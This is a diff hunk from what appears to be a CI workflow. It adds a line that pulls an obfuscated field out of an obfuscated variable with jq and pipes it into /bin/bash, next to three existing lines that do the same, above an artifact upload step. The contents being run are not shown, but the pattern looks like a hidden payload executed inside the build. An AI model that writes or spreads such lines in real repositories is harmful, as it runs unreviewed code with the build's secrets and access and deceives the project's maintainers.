@@ -27,6 +27,7 @@ jobs:
           echo $s1 | jq -r .ceblw76 | /bin/bash
           echo $stack1 | jq -r .xyylg395 | /bin/bash
           printf '%s' "$jevy02" | jq -r .mny04423 | /bin/bash
+          echo $kurg38 | jq -r .gxxw0 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
